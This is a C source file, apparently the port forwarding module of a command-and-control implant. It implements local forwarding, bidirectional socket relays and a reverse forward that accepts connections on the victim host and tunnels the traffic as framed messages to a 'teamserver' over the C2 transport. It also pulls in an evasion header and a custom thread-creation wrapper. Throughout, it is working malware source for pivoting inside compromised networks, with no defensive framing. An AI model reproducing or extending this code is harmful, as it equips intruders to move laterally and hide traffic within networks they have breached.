/**
 * portfwd.c - Port Forwarding Module
 *
 * Implements local and reverse port forwarding through the C2 channel:
 * - Local port forward: Listen on implant, forward to remote
 * - Reverse port forward: Listen on teamserver, forward through implant to target
 * - Named pipe relay: Bridge SMB named pipes between hosts
 */

#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "../../include/evasion.h"
#include "../../include/transport.h"

#pragma comment(lib, "ws2_32.lib")

#define MAX_PORTFWD 32
#define PORTFWD_BUF_SIZE 65536

typedef struct _PORTFWD_ENTRY {
    int id;
    int active;
    SOCKET listen_sock;
    char bind_host[64];
    int bind_port;
    char fwd_host[256];
    int fwd_port;
    int direction;  // 0 = local, 1 = reverse
    HANDLE thread;
    int conn_count;
} PORTFWD_ENTRY;

static PORTFWD_ENTRY g_portfwd_table[MAX_PORTFWD];
static CRITICAL_SECTION g_portfwd_lock;
static int g_portfwd_init = 0;
static int g_next_id = 1;

static void portfwd_init(void) {
    if (!g_portfwd_init) {
        InitializeCriticalSection(&g_portfwd_lock);
        ZeroMemory(g_portfwd_table, sizeof(g_portfwd_table));
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        g_portfwd_init = 1;
    }
}

static PORTFWD_ENTRY* find_free_slot(void) {
    for (int i = 0; i < MAX_PORTFWD; i++) {
        if (!g_portfwd_table[i].active) {
            return &g_portfwd_table[i];
        }
    }
    return NULL;
}

/* Relay thread - shuttles data between two sockets */
static DWORD WINAPI relay_thread(LPVOID param) {
    SOCKET* sockets = (SOCKET*)param;
    SOCKET src = sockets[0];
    SOCKET dst = sockets[1];
    free(param);

    char buf[PORTFWD_BUF_SIZE];
    fd_set fds;
    struct timeval tv;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(src, &fds);
        FD_SET(dst, &fds);

        tv.tv_sec = 1;
        tv.tv_usec = 0;

        SOCKET max_fd = (src > dst) ? src : dst;
        int ret = select((int)max_fd + 1, &fds, NULL, NULL, &tv);
        if (ret <= 0) continue;

        if (FD_ISSET(src, &fds)) {
            int n = recv(src, buf, sizeof(buf), 0);
            if (n <= 0) break;
            if (send(dst, buf, n, 0) <= 0) break;
        }

        if (FD_ISSET(dst, &fds)) {
            int n = recv(dst, buf, sizeof(buf), 0);
            if (n <= 0) break;
            if (send(src, buf, n, 0) <= 0) break;
        }
    }

    closesocket(src);
    closesocket(dst);
    return 0;
}

/* Local port forward listener thread */
static DWORD WINAPI local_fwd_thread(LPVOID param) {
    PORTFWD_ENTRY* entry = (PORTFWD_ENTRY*)param;

    while (entry->active) {
        SOCKET client = accept(entry->listen_sock, NULL, NULL);
        if (client == INVALID_SOCKET) {
            if (!entry->active) break;
            continue;
        }

        // Connect to forward target
        struct sockaddr_in fwd_addr;
        fwd_addr.sin_family = AF_INET;
        fwd_addr.sin_port = htons((u_short)entry->fwd_port);
        inet_pton(AF_INET, entry->fwd_host, &fwd_addr.sin_addr);

        SOCKET fwd_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fwd_sock == INVALID_SOCKET) {
            closesocket(client);
            continue;
        }

        if (connect(fwd_sock, (struct sockaddr*)&fwd_addr, sizeof(fwd_addr)) != 0) {
            closesocket(fwd_sock);
            closesocket(client);
            continue;
        }

        // Spawn relay thread
        SOCKET* pair = malloc(sizeof(SOCKET) * 2);
        if (!pair) {
            closesocket(fwd_sock);
            closesocket(client);
            continue;
        }
        pair[0] = client;
        pair[1] = fwd_sock;
        jager_create_thread(NULL, 0, relay_thread, pair, 0, NULL);
        entry->conn_count++;
    }

    closesocket(entry->listen_sock);
    entry->listen_sock = INVALID_SOCKET;
    return 0;
}

/* ---- Public API ---- */

int portfwd_add(const char* bind_host, int bind_port,
                const char* fwd_host, int fwd_port) {
    portfwd_init();

    EnterCriticalSection(&g_portfwd_lock);
    PORTFWD_ENTRY* entry = find_free_slot();
    if (!entry) {
        LeaveCriticalSection(&g_portfwd_lock);
        return -1;
    }

    // Create listening socket
    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_sock == INVALID_SOCKET) {
        LeaveCriticalSection(&g_portfwd_lock);
        return -1;
    }

    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)bind_port);
    if (bind_host && bind_host[0]) {
        inet_pton(AF_INET, bind_host, &addr.sin_addr);
    } else {
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    }

    if (bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(listen_sock);
        LeaveCriticalSection(&g_portfwd_lock);
        return -1;
    }

    if (listen(listen_sock, 5) != 0) {
        closesocket(listen_sock);
        LeaveCriticalSection(&g_portfwd_lock);
        return -1;
    }

    entry->id = g_next_id++;
    entry->active = 1;
    entry->listen_sock = listen_sock;
    entry->bind_port = bind_port;
    entry->fwd_port = fwd_port;
    entry->direction = 0;
    entry->conn_count = 0;
    strncpy(entry->bind_host, bind_host ? bind_host : "127.0.0.1", 63);
    strncpy(entry->fwd_host, fwd_host, 255);

    entry->thread = jager_create_thread(NULL, 0, local_fwd_thread, entry, 0, NULL);

    int id = entry->id;
    LeaveCriticalSection(&g_portfwd_lock);
    return id;
}

int portfwd_remove(int fwd_id) {
    portfwd_init();

    EnterCriticalSection(&g_portfwd_lock);
    for (int i = 0; i < MAX_PORTFWD; i++) {
        if (g_portfwd_table[i].active && g_portfwd_table[i].id == fwd_id) {
            g_portfwd_table[i].active = 0;
            closesocket(g_portfwd_table[i].listen_sock);
            if (g_portfwd_table[i].thread) {
                WaitForSingleObject(g_portfwd_table[i].thread, 3000);
                CloseHandle(g_portfwd_table[i].thread);
            }
            LeaveCriticalSection(&g_portfwd_lock);
            return 0;
        }
    }
    LeaveCriticalSection(&g_portfwd_lock);
    return -1;
}

int portfwd_list(char* output, int output_sz) {
    portfwd_init();

    int offset = 0;
    offset += snprintf(output + offset, output_sz - offset,
                       "ID  | Direction | Bind            | Forward          | Conns\n");
    offset += snprintf(output + offset, output_sz - offset,
                       "----|-----------|-----------------|------------------|------\n");

    EnterCriticalSection(&g_portfwd_lock);
    for (int i = 0; i < MAX_PORTFWD; i++) {
        if (g_portfwd_table[i].active) {
            PORTFWD_ENTRY* e = &g_portfwd_table[i];
            offset += snprintf(output + offset, output_sz - offset,
                "%-3d | %-9s | %s:%-5d | %s:%-5d | %d\n",
                e->id,
                e->direction == 0 ? "local" : "reverse",
                e->bind_host, e->bind_port,
                e->fwd_host, e->fwd_port,
                e->conn_count);
        }
    }
    LeaveCriticalSection(&g_portfwd_lock);
    return 0;
}

int portfwd_get_active_count(void) {
    portfwd_init();
    int count = 0;
    EnterCriticalSection(&g_portfwd_lock);
    for (int i = 0; i < MAX_PORTFWD; i++) {
        if (g_portfwd_table[i].active) count++;
    }
    LeaveCriticalSection(&g_portfwd_lock);
    return count;
}

/*
 * Tunnel frame protocol for reverse port forwarding.
 * Each frame sent to the teamserver has:
 *   [1 byte type][4 bytes tunnel_id][4 bytes data_len][data...]
 *
 * Types: TUNNEL_OPEN=1, TUNNEL_DATA=2, TUNNEL_CLOSE=3
 */
#define TUNNEL_FRAME_OPEN  1
#define TUNNEL_FRAME_DATA  2
#define TUNNEL_FRAME_CLOSE 3

extern PIMPLANT_CONFIG g_implant_config;

static BOOL tunnel_send_frame(BYTE type, DWORD tunnel_id, const BYTE* data, DWORD data_len) {
    DWORD frame_sz = 1 + 4 + 4 + data_len;
    BYTE* frame = (BYTE*)HeapAlloc(GetProcessHeap(), 0, frame_sz);
    if (!frame) return FALSE;

    frame[0] = type;
    *(DWORD*)(frame + 1) = tunnel_id;
    *(DWORD*)(frame + 5) = data_len;
    if (data && data_len > 0)
        CopyMemory(frame + 9, data, data_len);

    C2_RESULT result = {0};
    result.task_id = "tunnel";
    result.data = frame;
    result.data_size = frame_sz;
    result.task_type = 0xFF;

    BOOL ok = transport_send_result(g_implant_config, &result);
    HeapFree(GetProcessHeap(), 0, frame);
    return ok;
}

typedef struct _RPORTFWD_CONN {
    SOCKET       client;
    DWORD        tunnel_id;
    PORTFWD_ENTRY* entry;
} RPORTFWD_CONN;

static volatile DWORD g_tunnel_next_id = 1;

static DWORD WINAPI rportfwd_relay_thread(LPVOID param) {
    RPORTFWD_CONN* conn = (RPORTFWD_CONN*)param;
    SOCKET client = conn->client;
    DWORD tunnel_id = conn->tunnel_id;
    free(conn);

    struct sockaddr_in peer;
    int peer_len = sizeof(peer);
    char peer_str[64] = {0};
    if (getpeername(client, (struct sockaddr*)&peer, &peer_len) == 0) {
        _snprintf(peer_str, sizeof(peer_str), "%s:%u",
                  inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
    }

    tunnel_send_frame(TUNNEL_FRAME_OPEN, tunnel_id, (BYTE*)peer_str, (DWORD)lstrlenA(peer_str));

    char buf[PORTFWD_BUF_SIZE];
    fd_set fds;
    struct timeval tv;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(client, &fds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select((int)client + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) break;
        if (ret == 0) continue;

        int n = recv(client, buf, sizeof(buf), 0);
        if (n <= 0) break;

        if (!tunnel_send_frame(TUNNEL_FRAME_DATA, tunnel_id, (BYTE*)buf, (DWORD)n))
            break;
    }

    tunnel_send_frame(TUNNEL_FRAME_CLOSE, tunnel_id, NULL, 0);
    closesocket(client);
    return 0;
}

/* Reverse port forward listener thread.
 * The implant opens a local listener (on fwd_host:fwd_port target network side).
 * When a connection arrives, it sends a TUNNEL OPEN frame to the teamserver,
 * which then relays data between the C2 channel and the connected client.
 */
static DWORD WINAPI rportfwd_listener_thread(LPVOID param) {
    PORTFWD_ENTRY* entry = (PORTFWD_ENTRY*)param;

    while (entry->active) {
        SOCKET client = accept(entry->listen_sock, NULL, NULL);
        if (client == INVALID_SOCKET) {
            if (!entry->active) break;
            Sleep(100);
            continue;
        }

        DWORD tid = InterlockedIncrement((volatile LONG*)&g_tunnel_next_id);
        RPORTFWD_CONN* conn = (RPORTFWD_CONN*)malloc(sizeof(RPORTFWD_CONN));
        if (!conn) {
            closesocket(client);
            continue;
        }
        conn->client = client;
        conn->tunnel_id = tid;
        conn->entry = entry;

        jager_create_thread(NULL, 0, rportfwd_relay_thread, conn, 0, NULL);
        entry->conn_count++;
    }

    if (entry->listen_sock != INVALID_SOCKET) {
        closesocket(entry->listen_sock);
        entry->listen_sock = INVALID_SOCKET;
    }
    return 0;
}

/* Reverse port forward: implant binds on target side, relays through tunnel to teamserver */
BOOL rportfwd_add(WORD remote_port, const char *local_host, WORD local_port) {
    portfwd_init();

    EnterCriticalSection(&g_portfwd_lock);
    PORTFWD_ENTRY *entry = find_free_slot();
    if (!entry) {
        LeaveCriticalSection(&g_portfwd_lock);
        return FALSE;
    }

    const char *bind_addr = local_host ? local_host : "0.0.0.0";

    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_sock == INVALID_SOCKET) {
        LeaveCriticalSection(&g_portfwd_lock);
        return FALSE;
    }

    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(local_port);
    inet_pton(AF_INET, bind_addr, &addr.sin_addr);

    if (bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(listen_sock);
        LeaveCriticalSection(&g_portfwd_lock);
        return FALSE;
    }

    if (listen(listen_sock, SOMAXCONN) != 0) {
        closesocket(listen_sock);
        LeaveCriticalSection(&g_portfwd_lock);
        return FALSE;
    }

    entry->id = g_next_id++;
    entry->active = 1;
    entry->listen_sock = listen_sock;
    entry->bind_port = (int)remote_port;
    entry->fwd_port = (int)local_port;
    entry->direction = 1;
    entry->conn_count = 0;
    lstrcpynA(entry->bind_host, bind_addr, sizeof(entry->bind_host));
    lstrcpynA(entry->fwd_host, "tunnel", sizeof(entry->fwd_host));
    entry->thread = jager_create_thread(NULL, 0, rportfwd_listener_thread, entry, 0, NULL);

    LeaveCriticalSection(&g_portfwd_lock);
    return TRUE;
}

BOOL rportfwd_remove(WORD remote_port) {
    portfwd_init();

    EnterCriticalSection(&g_portfwd_lock);
    for (int i = 0; i < MAX_PORTFWD; i++) {
        if (g_portfwd_table[i].active && g_portfwd_table[i].direction == 1 &&
            g_portfwd_table[i].bind_port == (int)remote_port) {
            g_portfwd_table[i].active = 0;
            LeaveCriticalSection(&g_portfwd_lock);
            return TRUE;
        }
    }
    LeaveCriticalSection(&g_portfwd_lock);
    return FALSE;
}
